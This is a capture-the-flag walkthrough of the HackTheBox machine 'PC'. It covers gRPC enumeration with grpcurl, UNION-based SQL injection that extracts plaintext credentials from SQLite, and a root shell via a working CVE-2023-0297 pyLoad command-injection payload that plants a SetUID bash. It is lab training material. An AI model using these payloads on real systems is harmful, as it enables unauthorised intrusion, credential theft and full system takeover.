HTB: PC
=======

![PC](https://0xdf.gitlab.io/img/pc-cover.png)

PC starts with only SSH and TCP port 50051 open. I’ll poke at 50051 until I can figure out that it’s GRPC, and then use grpcurl to enumerate the service. I’ll find an SQL injection in the SQLite database and get some creds that I can use over SSH. To escalate, I’ll find an instance of pyLoad running as root and exploit a 2023 CVE to get execution. In Beyond Root, a video exploring the Python GRPC application to see how it works.

## Box Info

Name[PC](https://www.hackthebox.com/machines/pc) [![PC](https://0xdf.gitlab.io/icons/box-pc.png)](https://www.hackthebox.com/machines/pc)

[Play on HackTheBox](https://www.hackthebox.com/machines/pc)Release Date[20 May 2023](https://twitter.com/hackthebox_eu/status/1659219835426054149)Retire Date7 Oct 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]Rated Difficulty![Rated difficulty for PC](https://0xdf.gitlab.io/img/pc-diff.png)Radar Graph![Radar chart for PC](https://0xdf.gitlab.io/img/pc-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:16:51 [![htbas9du](https://www.hackthebox.eu/badge/image/388108)](https://app.hackthebox.com/users/388108)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)00:26:40 [![htbas9du](https://www.hackthebox.eu/badge/image/388108)](https://app.hackthebox.com/users/388108)

Creator[![sau123](https://www.hackthebox.eu/badge/image/201596)](https://app.hackthebox.com/users/201596)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and something unknown (50051):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.214
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-24 16:05 EDT
Nmap scan report for 10.10.11.214
Host is up (0.086s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
oxdf@hacky$ nmap -p 22,50051 -sCV 10.10.11.214
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-24 16:06 EDT
Nmap scan report for 10.10.11.214
Host is up (0.087s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.80%I=7%D=5/24%Time=646E6E4A%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
...[snip]...
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.29 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running Ubuntu 20.04 focal.

### gRPC - TCP 50051

#### Identify

Connecting to 50051 with `nc` returns only “???”:

```
oxdf@hacky$ nc 10.10.11.214 50051
???

```

The connection is open, and I can send data, but nothing I send seems to get a result.

Searching for “tcp 50051”, the third result is a Stack Overflow post about gRPC (with several others below it):

![image-20230524091446465](https://0xdf.gitlab.io/img/image-20230524091446465.png)

At this point in enumeration, it’s worth going through each potential lead to see if this could be what’s on that port. [This Stack Overflow answer](https://stackoverflow.com/a/72425722) confirms that 50051 is the default port of gRPC, so that could be what this is.

#### grpcurl

To test if this is actually gRPC, I’ll look for posts on how to interact with it. [This post](https://notes.akenofu.me/Network%20Pen%20test/gRPC/) about pentesting gRPC shows using `grpcurl`, which I’ll install with `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest` (this requires having `go` installed and configured on my VM, which is described in detail [here](https://go.dev/doc/install)). I’ll also show gRPC UI [below](#grpc-ui).

The first command in the post is `grpcurl [target:port] list`. Here, that throws an error:

```
oxdf@hacky$ grpcurl 10.10.11.214:50051 list
Failed to dial target host "10.10.11.214:50051": tls: first record does not look like a TLS handshake

```

It’s complaining that the server didn’t reply with a TLS handshake, as gRPC works over TLS by default. Luckily, there’s a switch in `grpcurl` to say don’t use TLS:

```
oxdf@hacky$ grpcurl -help
Usage:
        grpcurl [flags] [address] [list|describe] [symbol]
...[snip]...
  -plaintext
        Use plain-text HTTP/2 when connecting to server (no TLS).
...[snip]...

```

It works:

```
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

```

It seems at this point that I have identified the service as gRPC.

#### Enumerate

`grpc.reflection.v1alpha.ServerReflection` is in both the blog post and on PC, and it is what allows for enumeration of the RPC endpoints.

I’ll focus on `SimpleApp`, which is unique to PC. `list` can give the available methods:

```
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

```

In theory I should be able to use `describe` for each of these, but they don’t work:

```
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp.LoginUser
Failed to resolve symbol "SimpleApp.LoginUser": Symbol not found: SimpleApp.LoginUser
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp.RegisterUser
Failed to resolve symbol "SimpleApp.RegisterUser": Symbol not found: SimpleApp.RegisterUser
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp.getInfo
Failed to resolve symbol "SimpleApp.getInfo": Symbol not found: SimpleApp.getInfo

```

However, using `describe` on the entire app works:

```
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}

```

I can also `describe` each of the object types:

```
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserResponse
LoginUserResponse is a message:
message LoginUserResponse {
  string message = 1;
}
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserResponse
RegisterUserResponse is a message:
message RegisterUserResponse {
  string message = 1;
}
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
oxdf@hacky$ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoResponse
getInfoResponse is a message:
message getInfoResponse {
  string message = 1;
}

```

I can try to talk to one of the end points. `getInfo` seems like a reasonable target. I’ll pass the required information, but it errors saying that it requires a `token` header:

```
oxdf@hacky$ grpcurl -plaintext -format text -d 'id: "1"' 10.10.11.214:50051 SimpleApp.getInfo
message: "Authorization Error.Missing 'token' header"

```

That implies auth is required.

#### Registered User

Registering requires two strings, `username` and `password`. It returns success:

```
oxdf@hacky$ grpcurl -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.RegisterUser
message: "Account created for user 0xdf!"

```

I can then login:

```
oxdf@hacky$ grpcurl -d 'username: "0xdf", password: "0xdf0xdf"' 10.10.11.214:50051 -plaintext -format text SimpleApp.LoginUser
message: "Your id is 53."

```

I expected this to return a token so I could use `GetInfo`, but I don’t see one. I’ll log in again, this time with the verbose flag:

```
oxdf@hacky$ grpcurl -v -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
message: "Your id is 54."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMHhkZiIsImV4cCI6MTY4NDk1MDA4MX0.ceNvHZVGGIxFzmdDjxoW0Ipu9qoStdyTa_vUPQfeVbE'
Sent 1 request and received 1 response

```

There is a JSON Web Token (JWT) in the response trailers section.

#### getInfo

I already saw that trying to access `getInfo` fails requiring a `token` header. To add a header is just like `curl`, with `-H`:

```
oxdf@hacky$ grpcurl -d 'id: "54"' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMHhkZiIsImV4cCI6MTY4NDk1MDA4MX0.ceNvHZVGGIxFzmdDjxoW0Ipu9qoStdyTa_vUPQfeVbE" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."

```

It just says “Will update soon”. If I request a user that doesn’t exist, it errors out:

```
oxdf@hacky$ grpcurl -d 'id: "53"' -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMHhkZiIsImV4cCI6MTY4NDk1MDA4MX0.ceNvHZVGGIxFzmdDjxoW0Ipu9qoStdyTa_vUPQfeVbE" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable

```

If I register another user and try to request their ID, it just says “Will update soon”.

#### gRPC UI

_update 2023-10-10:_ [Nicolas Krassas](https://twitter.com/Dinosn) suggested that I also look into [gPRC UI](https://github.com/fullstorydev/grpcui). It’s a GUI tool that allows for interaction through a web GUI.

I’ll install it with `go install github.com/fullstorydev/grpcui/cmd/grpcui@latest` (which assumes I’ve [installed golang](https://go.dev/doc/install)), and launch it pointing at the gRPC service:

```
oxdf@hacky$ grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:35325/
Gtk-Message: 09:58:07.114: Failed to load module "appmenu-gtk-module"
Gtk-Message: 09:58:07.115: Not loading module "atk-bridge": The functionality is provided by GTK natively. Please try to not load it.

(firefox:171499): Gtk-WARNING **: 09:58:07.130: GTK+ module /snap/firefox/3131/gnome-platform/usr/lib/gtk-2.0/modules/libcanberra-gtk-module.so cannot be loaded.
GTK+ 2.x symbols detected. Using GTK+ 2.x and GTK+ 3 in the same process is not supported.
Gtk-Message: 09:58:07.130: Failed to load module "canberra-gtk-module"

```

It listens on a random high port, and then launches Firefox with `http://127.0.0.1:[port]` loaded:

![image-20231010095847948](https://0xdf.gitlab.io/img/image-20231010095847948.png)

For each RPC method, it has the options and the types. I can register and the result is shown in the “Response” tab:

![image-20231010100041861](https://0xdf.gitlab.io/img/image-20231010100041861.png)

On logging in, the “Response Trailers” are also shown:

![image-20231010100148441](https://0xdf.gitlab.io/img/image-20231010100148441.png)

## Shell as sau

### Resets

The accounts on the app seem to reset every 10 minutes. It’s very annoying. I created one line that I could up-arrow to and re-run that will create a user and login twice. On the first login, it captures the token and exports that as an environment variable. On the second, it prints to the screen the new account’s user id:

```
grpcurl -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.RegisterUser; export TOKEN=$(grpcurl -v -plaintext -format text -d 'username: "0xdf", password: "0xdf0xdf"' 10.10.11.214:50051 SimpleApp.LoginUser | grep token | cut -d"'" -f2); grpcurl -v -plaintext -format text -d 'username: "0xdf", password: "0xdf0xdf"' 10.10.11.214:50051 SimpleApp.LoginUser | grep message

```

It runs like:

```
oxdf@hacky$ grpcurl -d 'username: "0xdf", password: "0xdf0xdf"' -plaintext -format text 10.10.11.214:50051 SimpleApp.RegisterUser; export TOKEN=$(grpcurl -v -plaintext -format text -d 'username: "0xdf", password: "0xdf0xdf"' 10.10.11.214:50051 SimpleApp.LoginUser | grep token | cut -d"'" -f2); grpcurl -v -plaintext -format text -d 'username: "0xdf", password: "0xdf0xdf"' 10.10.11.214:50051 SimpleApp.LoginUser | grep message
message: "Account created for user 0xdf!"
message: "Your id is 250."

```

After running that I can use `$TOKEN` to query:

```
oxdf@hacky$ grpcurl -d 'id: "320"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."

```

### Identify SQL Injection

I’ll try some different payloads to see what happens. Adding a `'` seems to break it:

```
oxdf@hacky$ grpcurl -d "id: \"320\"" -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."
oxdf@hacky$ grpcurl -d "id: \"320'\"" -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation

```

That could be SQL injection, but it could just as easily be that there is no user with id `320'`. I’ll try adding a `UNION` statement to see if I can inject data:

```
oxdf@hacky$ grpcurl -d "id: \"320' union select 1\"" -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation

```

Still nothing. Interestingly, if I remove the `'`, there’s injection:

```
oxdf@hacky$ grpcurl -d "id: \"320 union select 1\"" -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "1"

```

That means that the SQL query is something like `select * from table where userid = {input}`, and the `input` is an integer, so it isn’t wrapped in `"` or `'`.

### Enumerate DB

#### Identify DB

I’ll replace the 1 with `user()` and `version()`, but both break:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select user()"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation
oxdf@hacky$ grpcurl -d 'id: "320 union select version()"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation

```

This might not be MySQL. It could be SQLite. I’ll try `sqlite_version()`, and it works:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select sqlite_version()"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "3.31.1"

```

#### Get Table Names

PayloadsAllTheThings has a [SQLite Injection page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#string-based---extract-database-structure). I’ll use the query here to get the table names:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select tbl_name from sqlite_master where type=\"table\" and tbl_name NOT LIKE \"sqlite_%\""' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "accounts"

```

The trick is making sure to nest `"` and `'` properly. It seems this application is only sending back the first one, so I’ll add `group_concat()` to get all of them:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select group_concat(tbl_name) from sqlite_master where type=\"table\" and tbl_name NOT LIKE \"sqlite_%\""' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "accounts,messages"

```

#### Table Structures

The query from PayloadsAllTheThings to get the column names works:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select group_concat(sql) from sqlite_master where type!=\"meta\" and sql NOT NULL and name =\"messages\""' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "CREATE TABLE messages(id INT UNIQUE, username TEXT UNIQUE,message TEXT)"

```

It’s returning the string that shows how the table was created. I can get both in one query:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select group_concat(sql) from sqlite_master where type!=\"meta\" and sql NOT NULL"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n),CREATE TABLE messages(id INT UNIQUE, username TEXT UNIQUE,message TEXT)"

```

`accounts` has `username` and `password`, `messages` has `id`, `username`, and `message`.

#### messages

There are only two messages in the DB:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select group_concat(id || \":\" || username || \":\" || message) from messages"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "1:admin:The admin is working hard to fix the issues.,652:0xdf:Will update soon."

```

I’m using `||` to concatenate columns, and then `group_concat` to get multiple rows. The message from admin says the admin is working on issues, and the other is the message for my current user.

#### accounts

There are three rows in `accounts`:

```
oxdf@hacky$ grpcurl -d 'id: "320 union select group_concat(username || \":\" || password ) from accounts"' -H "token: $TOKEN" -plaintext -format text 10.10.11.214:50051 SimpleApp.getInfo
message: "admin:admin,sau:HereIsYourPassWord1431,0xdf:0xdf0xdf"

```

admin has the password admin, and sau has the password “HereIsYourPassWord1431”.

### SSH

That password works for sau over SSH:

```
oxdf@hacky$ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
sau@pc:~$

```

And I can read `user.txt`:

```
sau@pc:~$ cat user.txt
1b0d383d************************

```

## Shell as root

### Enumeration

#### sau

sau cannot run `sudo`:

```
sau@pc:~$ sudo -l
[sudo] password for sau:
Sorry, user sau may not run sudo on localhost.

```

Their home directory is empty as well:

```
sau@pc:~$ ls -la
total 28
drwxr-xr-x 3 sau  sau  4096 Jan 11 18:09 .
drwxr-xr-x 3 root root 4096 Jan 11 18:10 ..
lrwxrwxrwx 1 root root    9 Jan 11 18:08 .bash_history -> /dev/null
-rw-r--r-- 1 sau  sau   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sau  sau  3771 Feb 25  2020 .bashrc
drwx------ 2 sau  sau  4096 Jan 11 17:43 .cache
-rw-r--r-- 1 sau  sau   807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jan 11 18:09 .viminfo -> /dev/null
-rw-r----- 1 root sau    33 May 24 12:44 user.txt

```

#### File System

There are no other users on the box with directories in `/home`. The web application is running from `/opt/app`, but there’s nothing else in there to help with the exploitation of this box. I’ll explore it a bit in [Beyond Root](#beyond-root).

The file system is relatively empty.

#### Processes / Network

Looking at the process list, there are two Python processes running as root that stand out as non-standard:

```
sau@pc:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root        1036  0.0  0.7 634808 31204 ?        Ssl  12:44   0:07 /usr/bin/python3 /opt/app/app.py
root        1042  0.0  1.4 1215780 58500 ?       Ssl  12:44   0:11 /usr/bin/python3 /usr/local/bin/pyload
...[snip]...

```

The first is the gRPC server. The other is an instance of [PyLoad](https://pyload.net/), an opensource download manager written in Python.

Looking at `netstat`, there are two ports I hadn’t seen yet, 8000 and 9666:

```
sau@pc:/$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -

```

#### PyLoad

9666 and 8000 both are hosting (the same?) webserver:

```
sau@pc:~$ curl localhost:9666
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2Flocalhost%3A9666%2F">/login?next=http%3A%2F%2Flocalhost%3A9666%2F</a>. If not, click the link.
sau@pc:~$ curl localhost:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2Flocalhost%3A8000%2F">/login?next=http%3A%2F%2Flocalhost%3A8000%2F</a>. If not, click the link.

```

I’ll reconnect my SSH session with these ports forwarded:

```
oxdf@hacky$ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214 -L 9666:localhost:9666 -L 8000:localhost:8000
Last login: Wed May 24 17:14:48 2023 from 10.10.14.6
sau@pc:~$

```

Both seem to load the same page, a [pyLoad](https://pyload.net/) login:

![image-20230524132739816](https://0xdf.gitlab.io/img/image-20230524132739816.png)

### Exploit

#### Find

[pyLoad](https://pyload.net/) is a download manager written in Python. Searching for “pyload exploit” returns a bunch of references to CVE-2023-0297, a command injection vulnerability in PyLoad:

![image-20230524132937956](https://0xdf.gitlab.io/img/image-20230524132937956.png)

#### CVE-2023-0297 Background

[This commit](https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d) shows the changes that “fix arbitrary python code execution by abusing js2py functionality”. The change is very simple:

![image-20230524133112062](https://0xdf.gitlab.io/img/image-20230524133112062.png)

[This gist](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad) does a really nice job describing the bug. The `/flash/addcrypted2` endpoint passes user input directly into a function named `eval_js`, which passes that into `js2py.eval_js`, a function form the `js2py` library. This library is designed to run JavaScript in this Python context.

`js2py` has a feature that’s on by default known as `pyimport`. It allows importing Python libraries to run alongside the JavaScript it’s executing. So if it’s not disabled, I can use `pyimport` to get Python code, and run that in an unsafe way. The patch above disables `pyimport` for pyLoad.

#### POC

There’s a POC in the gist above using `curl`:

```
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://<target>/flash/addcrypted2'

```

I’ll clean that up a bit and run it:

```
oxdf@hacky$ curl -d 'jk=pyimport os;os.system("touch /tmp/0xdf");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' http://127.0.0.1:9666/flash/addcrypted2

```

The `touch` command worked, as that file now exists, owned by root:

```
sau@pc:~$ ls -l /tmp/0xdf
-rw-r--r-- 1 root root 0 May 24 17:46 /tmp/0xdf

```

#### Shell

I’ll change the payload from creating a file to making a SetUID / SetGID copy of `bash`:

```
oxdf@hacky$ curl -d 'jk=pyimport os;os.system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' http://127.0.0.1:9666/flash/addcrypted2
Could not decrypt key

```

Back in my shell, I’ll run it (with `-p` to not drop privs):

```
sau@pc:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1001(sau) gid=1001(sau) euid=0(root) egid=0(root) groups=0(root),1001(sau)

```

With that I can read `root.txt`:

```
0xdf-5.0# cat root.txt
d88264b0************************

```

## Beyond Root

I thought it would be interesting to see how the GRPC application is set up and configured, and I find it in `/opt`:

```
root@pc:/opt/app# ls
__pycache__  app.proto  app.py  app_pb2.py  app_pb2_grpc.py  middle.py  sqlite.db

```

The GRPC Python module creates the `app_pb2.py` and `app_pb2_grpc.py` files from the `app.proto` file, and then `app.py` uses those to run the service. [This video](https://www.youtube.com/watch?v=c1XGbS4uRlw) has more details:





